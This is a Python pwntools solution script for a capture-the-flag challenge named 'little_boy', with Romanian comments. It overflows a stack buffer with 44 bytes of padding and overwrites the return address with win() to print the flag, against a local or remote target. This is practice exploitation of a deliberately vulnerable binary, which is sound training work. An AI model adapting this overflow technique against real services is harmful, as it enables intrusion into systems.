#!/usr/bin/env python3
# ============================================================================
# CTF: little_boy — ret2win clasic (stack BOF)
# Vulnerabilitate: overflow pe buffer (44 bytes padding) => suprascrii return
#   address cu adresa functiei win(), care printeaza flag-ul.
# Binar: ELF 32-bit (i386), not stripped | NX on · fara canary · No-PIE · Partial RELRO
#   - Fara canary => se ajunge direct la ret. No-PIE => win() e la adresa fixa
#     (elf.symbols['win']). NX irelevant (nu injectam shellcode, doar ret2win).
# ============================================================================
import sys
import re
from pwn import *

context.binary = elf = ELF('./little_boy')
context.log_level = 'error'          # scoate zgomotul pwntools

def connect():
    if len(sys.argv) >= 3 and sys.argv[2].isdigit():
        return remote(sys.argv[1], sys.argv[2])
    return process('./little_boy')

p = connect()

win = elf.symbols['win']

p.recvuntil(b"Insert your message to the world")
payload = b"A" * 44
payload += p32(win)
p.sendline(payload)

out = p.recvall(timeout=2)
# cauta un flag care incepe cu CTF, SI sau FLAG; daca nu-l gaseste, arata output-ul brut
flag = re.search(rb"(CTF|SI|FLAG)\{[^}]*\}", out)
print(flag.group().decode() if flag else out)
